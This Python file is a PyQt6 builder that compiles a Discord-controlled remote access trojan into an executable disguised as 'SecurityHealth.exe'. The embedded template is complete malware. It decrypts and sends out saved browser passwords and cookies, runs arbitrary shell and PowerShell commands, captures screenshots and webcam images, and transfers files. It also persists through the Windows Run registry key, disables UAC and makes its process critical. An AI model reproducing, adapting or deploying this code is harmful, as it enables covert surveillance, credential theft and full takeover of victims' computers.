import sys
import subprocess
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLineEdit,
    QPushButton, QVBoxLayout, QMessageBox, QDialog
)


TEMPLATE = r'''
import os
import platform
import subprocess
import sys
import asyncio
import winreg
import ctypes
import shutil
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import webbrowser
from io import BytesIO
import discord
import pyautogui
import cv2
from discord.ext import tasks

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


DISCORD_BOT_TOKEN = "tokenhere"
GUILD_ID = guildhere
LOG_CHANNEL_NAME = "rat-log"
CLIENT_CHANNEL_PREFIX = "rat-"

intents = discord.Intents.all()
client = discord.Client(intents=intents)

base_path = os.getcwd()
client_id = platform.node() or os.getenv("COMPUTERNAME") or "unknown"
assigned_channel = None  


class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_ubyte))]

def CryptUnprotectData(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), ctypes.POINTER(ctypes.c_ubyte)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        pointer = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_ubyte * blob_out.cbData))
        decrypted_bytes = bytes(pointer.contents)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted_bytes
    else:
        return None

def decrypt_value(enc, key):
    try:
        if enc[:3] == b'v10':
            nonce = enc[3:15]
            ciphertext = enc[15:-16]
            tag = enc[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_pass.decode()
        else:

            import ctypes.wintypes

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD),
                            ('pbData', ctypes.POINTER(ctypes.c_char))]

            def CryptUnprotectData(encrypted_bytes):
                blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
                blob_out = DATA_BLOB()
                if ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
                ):
                    pointer = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_char * blob_out.cbData))
                    decrypted_bytes = pointer.contents.raw
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return decrypted_bytes
                else:
                    return None

            decrypted_pass = CryptUnprotectData(enc)
            return decrypted_pass.decode() if decrypted_pass else ""
    except Exception as e:
        return f"Error decrypting: {e}"
    
def make_critical():
    try:
        ntdll = ctypes.windll.ntdll
        RtlSetProcessIsCritical = ntdll.RtlSetProcessIsCritical
        RtlSetProcessIsCritical.argtypes = [ctypes.c_bool, ctypes.POINTER(ctypes.c_bool), ctypes.c_bool]
        RtlSetProcessIsCritical.restype = ctypes.c_long

        old = ctypes.c_bool(False)
        status = RtlSetProcessIsCritical(True, ctypes.byref(old), False)
        if status == 0:
            return "[+] Process is now critical."
        else:
            return f"[-] Failed to make critical. NTSTATUS={status}"
    except Exception as e:
        return f"[!] Error: {e}"

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:] 
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    def CryptUnprotectData(encrypted_bytes):
        blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            pointer = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_char * blob_out.cbData))
            decrypted_bytes = pointer.contents.raw
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted_bytes
        else:
            return None

    key = CryptUnprotectData(encrypted_key)
    return key

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    def CryptUnprotectData(encrypted_bytes):
        blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            pointer = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_char * blob_out.cbData))
            decrypted_bytes = pointer.contents.raw
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted_bytes
        else:
            return None

    key = CryptUnprotectData(encrypted_key)
    return key

def add_payload_persistence():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SecurityHealth"

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.QueryValueEx(key, value_name)
            winreg.CloseKey(key)
            return "Already persisted"
        except FileNotFoundError:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return "[+] Persistence added via HKCU Run key"
    except Exception as e:
        return f"[!] Failed to add persistence: {e}"

def remove_persistence():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SecurityHealth"

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteValue(key, value_name)
            winreg.CloseKey(key)
            return "[+] Persistence removed successfully"
        except FileNotFoundError:
            winreg.CloseKey(key)
            return "[!] Persistence not found"
    except Exception as e:
        return f"[!] Failed to remove persistence: {e}"

def get_clipboard():
    try:
        import pyperclip
        clipboard_content = pyperclip.paste()
        return f"[+] Clipboard content: {clipboard_content}"
    except Exception as e:
        return f"[!] Failed to retrieve clipboard content: {e}"

def set_clipboard(content):
    try:
        import pyperclip
        pyperclip.copy(content)
        return "[+] Clipboard content set successfully"
    except Exception as e:
        return f"[!] Failed to set clipboard content: {e}"   
    
def grab_passwords():
    browsers = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data"),
        "Brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data"),
        "Opera": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable"),
        "Opera GX": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable"),
    }

    results = ""
    for name, path in browsers.items():
        login_db = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(login_db):
            continue

        try:
            key = get_master_key(path)
            if not key:
                continue

            temp_copy = os.path.join(os.getenv("TEMP"), f"{name}_logins.db")
            shutil.copy2(login_db, temp_copy)

            conn = sqlite3.connect(temp_copy)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            results += f"\n=== {name} Passwords ===\n"
            for url, user, enc_pass in cursor.fetchall():
                if user or enc_pass:
                    decrypted = decrypt_value(enc_pass, key)
                    results += f"[+] {url}\nUser: {user}\nPass: {decrypted}\n\n"

            cursor.close()
            conn.close()
            os.remove(temp_copy)
        except Exception as e:
            results += f"[!] {name} error: {e}\n"

    return results or "[!] No passwords found."


def grab_cookies():
    browsers = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data"),
        "Brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data"),
        "Opera": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable"),
        "Opera GX": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable"),
    }

    results = ""
    for name, path in browsers.items():
        cookies_db = os.path.join(path, "Default", "Cookies")
        if not os.path.exists(cookies_db):
            continue

        try:
            key = get_master_key(path)
            if not key:
                continue

            temp_copy = os.path.join(os.getenv("TEMP"), f"{name}_cookies.db")
            shutil.copy2(cookies_db, temp_copy)

            conn = sqlite3.connect(temp_copy)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

            results += f"\n=== {name} Cookies ===\n"
            for domain, name, enc_value in cursor.fetchall():
                decrypted = decrypt_value(enc_value, key)
                results += f"[+] {domain} | {name} = {decrypted}\n"

            cursor.close()
            conn.close()
            os.remove(temp_copy)
        except Exception as e:
            results += f"[!] {name} error: {e}\n"

    return results or "[!] No cookies found."

async def wait_for_client_channel(guild):
    client_channel_name = CLIENT_CHANNEL_PREFIX + client_id.lower()
    for _ in range(30):  
        channel = discord.utils.get(guild.text_channels, name=client_channel_name)
        if channel:
            return channel
        await asyncio.sleep(1)
    return None

@client.event
async def on_ready():
    global assigned_channel
    print(f"[+] Connected to Discord as {client.user}")

    guild = client.get_guild(GUILD_ID)
    if guild is None:
        print("[-] Guild not found. Check GUILD_ID.")
        await client.close()
        return

    log_channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_channel:
        await log_channel.send(f"[+] New client online: `{client_id}`")
        await log_channel.send(f"!register {client_id}")
    else:
        print("[-] Log channel not found. Exiting.")
        await client.close()
        return

    assigned_channel = await wait_for_client_channel(guild)
    if assigned_channel is None:
        print("[-] Client channel not found after waiting. Exiting.")
        await client.close()
        return

    print(f"[+] Assigned to channel: {assigned_channel.name}")

@client.event
async def on_message(message):
    global assigned_channel
    if message.author == client.user:
        return

    if assigned_channel is None:
        return

    if message.channel != assigned_channel:
        return

    cmd = message.content.strip()

    if cmd == "pwd":
        await assigned_channel.send(base_path)

    elif cmd.startswith("cd "):
        path = cmd[3:].strip()
        try:
            os.chdir(path)
            await assigned_channel.send(f"[+] Moved to {path}")
        except Exception as e:
            await assigned_channel.send(f"[-] cd failed: {e}")

    elif cmd == "critical":
        result = make_critical()
        await assigned_channel.send(result)

    elif cmd.startswith("ps "):
        try:
            ps_command = cmd[3:].strip()
            completed = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
            output = completed.stdout + completed.stderr
            await assigned_channel.send("```\n" + output[:1900] + "\n```")
        except Exception as e:
            await assigned_channel.send(f"[-] ps error: {e}")

    elif cmd == "ls":
        try:
            files = os.listdir()
            await assigned_channel.send("```\n" + "\n".join(files) + "\n```")
        except Exception as e:
            await assigned_channel.send(f"[-] ls failed: {e}")

    elif cmd.startswith("cmd "):
        try:
            output = subprocess.getoutput(cmd[4:])
            await assigned_channel.send("```\n" + output[:1900] + "\n```")
        except Exception as e:
            await assigned_channel.send(f"[-] cmd error: {e}")

    elif cmd == "screenshot":
        img = pyautogui.screenshot()
        buf = BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await assigned_channel.send(file=discord.File(buf, filename="screenshot.png"))

    elif cmd == "webcam":
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, img_buf = cv2.imencode(".png", frame)
                await assigned_channel.send(file=discord.File(fp=BytesIO(img_buf.tobytes()), filename="webcam.png"))
            else:
                await assigned_channel.send("[-] Failed to capture webcam")
        except Exception as e:
            await assigned_channel.send(f"[-] Webcam error: {e}")

    elif cmd.startswith("upload "):
        target = cmd[7:].strip()
        if message.attachments:
            data = await message.attachments[0].read()
            with open(target, "wb") as f:
                f.write(data)
            await assigned_channel.send(f"[+] File uploaded to {target}")
        else:
            await assigned_channel.send("[-] No attachment found")

    elif cmd.startswith("download "):
        file_path = cmd[9:].strip()
        if os.path.exists(file_path):
            await assigned_channel.send(file=discord.File(file_path))
        else:
            await assigned_channel.send("[-] File not found")

    elif cmd == "stream":
        await assigned_channel.send("[*] Starting stream...")
        start_stream.start()

    elif cmd == "stopstream":
        start_stream.stop()
        await assigned_channel.send("[*] Stream stopped.")

    elif cmd.startswith("killrat "):
        pid = cmd[8:].strip()
        try:
            subprocess.run(["taskkill", "/PID", pid, "/F"], check=True)
            await assigned_channel.send(f"[+] Killed RAT process with PID {pid}")
        except subprocess.CalledProcessError as e:
            await assigned_channel.send(f"[-] Failed to kill PID {pid}: {e}")

    elif cmd == "listprocs":
        try:
            result = subprocess.check_output(
                'tasklist | findstr "Win_svchost.exe"',
                shell=True, text=True
            )
            await assigned_channel.send(f"```\n{result}\n```")
        except subprocess.CalledProcessError:
            await assigned_channel.send("[-] No matching process found")

    elif cmd == "persistpayload":
        result = add_payload_persistence()
        await assigned_channel.send(f"```{result}```")

    elif cmd == "unpersistpayload":
        result = remove_persistence()
        await assigned_channel.send(f"```{result}```")

    elif cmd == "help" or cmd == "commands":
        help_text = (
            "**Available Commands:**\n"
            "- `pwd` : Show current working directory\n"
            "- `cd <path>` : Change directory\n"
            "- `ls` : List files in current directory\n"
            "- `cmd <command>` : Run shell command\n"
            "- `ps <command>` : Run PowerShell command\n"
            "- `screenshot` : Take a screenshot\n"
            "- `webcam` : Capture image from webcam\n"
            "- `upload <filename>` : Upload a file (attach file to message)\n"
            "- `download <filename>` : Download a file\n"
            "- `critical` : Make payload critical process\n"
            "- `grabpasswords` : Steal user passwords\n"
            "- `grabcookies` : Steal user cookies\n"
            "- `listprocs` : List current running rats\n"
            "- `killrat` : Kill PID-specified rat process\n"
            "- `stream` : Start streaming screenshots\n"
            "- `disableuac` : Disable UAC permanently\n"
            "- `enableuac` : Enable UAC permanently\n"
            "- `stopstream` : Stop streaming screenshots\n"
            "- `persistpayload` : Add payload persistence\n"
            "- `unpersistpayload` : Remove payload persistence\n"
            "- `getclipboard` : Retrieve the contents of the clipboard\n"
            "- `setclipboard <text>` : Set the contents of the clipboard to specified text\n"
        )
        await assigned_channel.send(help_text)

    elif cmd == "grabpasswords":
        await assigned_channel.send("[*] Grabbing Chromium-based browser passwords...")
        result = grab_passwords()
        if len(result) < 1900:
            await assigned_channel.send("```\n" + result + "\n```")
        else:
            with open("passwords.txt", "w", encoding="utf-8") as f:
                f.write(result)
            await assigned_channel.send(file=discord.File("passwords.txt"))
            os.remove("passwords.txt")

    elif cmd == "disableuac":
        try:
            subprocess.run([
                "powershell", "-Command",
                'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0'
            ], check=True)
            await assigned_channel.send("[+] UAC disabled (reboot may be required)")
        except Exception as e:
            await assigned_channel.send(f"[-] Failed to disable UAC: {e}")

    elif cmd == "enableuac":
        try:
            subprocess.run([
                "powershell", "-Command",
                'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 1'
            ], check=True)
            await assigned_channel.send("[+] UAC enabled")
        except Exception as e:
            await assigned_channel.send(f"[-] Failed to enable UAC: {e}")

    elif cmd == "grabcookies":
        await assigned_channel.send("[*] Grabbing Chromium-based browser cookies...")
        result = grab_cookies()
        if len(result) < 1900:
            await assigned_channel.send("```\n" + result + "\n```")
        else:
            with open("cookies.txt", "w", encoding="utf-8") as f:
                f.write(result)
            await assigned_channel.send(file=discord.File("cookies.txt"))
            os.remove("cookies.txt")

    elif cmd == "getclipboard":
        try:
            import pyperclip
            clipboard_content = pyperclip.paste()
            await assigned_channel.send(f"[+] Clipboard content: {clipboard_content}")
        except Exception as e:
            await assigned_channel.send(f"[-] Failed to retrieve clipboard content: {e}")

    elif cmd.startswith("setclipboard "):
        content = cmd[len("setclipboard "):].strip()
        try:
            import pyperclip
            pyperclip.copy(content)
            await assigned_channel.send("[+] Clipboard content set successfully")
        except Exception as e:
            await assigned_channel.send(f"[-] Failed to set clipboard content: {e}")

@tasks.loop(seconds=1)
async def start_stream():
    img = pyautogui.screenshot()
    buf = BytesIO()
    img.save(buf, format="JPEG")
    buf.seek(0)
    await assigned_channel.send(file=discord.File(buf, filename="frame.jpg"))


async def safe_run():
    while True:
        try:
            await client.start(DISCORD_BOT_TOKEN)
            break
        except Exception as e:
            print(f"[!] Discord connection failed: {e}. Retrying in 10 seconds...")
            await asyncio.sleep(10)

if __name__ == "__main__":
    if not is_admin():
        params = " ".join([f'"{arg}"' for arg in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1
        )
        sys.exit()


    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(safe_run())
    except KeyboardInterrupt:
        print("[!] Bot manually interrupted.")
    finally:
        loop.run_until_complete(client.close())
        loop.close()
'''

class ExeOptions(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Build Options")
        self.setFixedSize(250, 140)

        layout = QVBoxLayout()
        self.build_btn = QPushButton("Build EXE")
        self.build_btn.clicked.connect(self.accept)
        layout.addWidget(self.build_btn)
        self.setLayout(layout)


class Builder(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Builder")
        self.setFixedSize(380, 260)

        self.setStyleSheet("""
            QWidget {
                background-color: #121212;
                color: white;
                font-size: 14px;
            }
            QLineEdit {
                background-color: #1e1e1e;
                border-radius: 8px;
                padding: 6px;
            }
            QPushButton {
                background-color: #2c2c2c;
                border-radius: 8px;
                padding: 8px;
            }
            QPushButton:hover {
                background-color: #3a3a3a;
            }
        """)

        layout = QVBoxLayout()

        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Discord Bot Token")
        self.token_input.setEchoMode(QLineEdit.EchoMode.Password)

        self.guild_input = QLineEdit()
        self.guild_input.setPlaceholderText("Guild / Server ID")

        self.exe_btn = QPushButton("Build Python + EXE")
        self.exe_btn.clicked.connect(self.build_exe)

        layout.addWidget(self.token_input)
        layout.addWidget(self.guild_input)
        layout.addWidget(self.exe_btn)

        self.setLayout(layout)

    def generate_script(self):
        token = self.token_input.text().strip()
        guild = self.guild_input.text().strip()

        if not token or not guild:
            QMessageBox.warning(self, "Error", "All fields are required.")
            return None

        script = TEMPLATE.replace("tokenhere", token)
        script = script.replace("guildhere", guild)
        return script

    def build_exe(self):
        dialog = ExeOptions()
        if not dialog.exec():
            return

        script = self.generate_script()
        if not script:
            return

        py_file = "SecurityHealth.py"
        exe_name = "SecurityHealth.exe"
        icon_file = "ico.ico"  

        with open(py_file, "w", encoding="utf-8") as f:
            f.write(script)

        try:
            subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    f"--icon={icon_file}",
                    "--name=SecurityHealth",
                    py_file
                ],
                check=True
            )

            QMessageBox.information(
                self,
                "Success",
                "Python file and EXE built successfully!"
            )

        except Exception as e:
            QMessageBox.critical(self, "Build Failed", str(e))


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = Builder()
    win.show()
    sys.exit(app.exec())
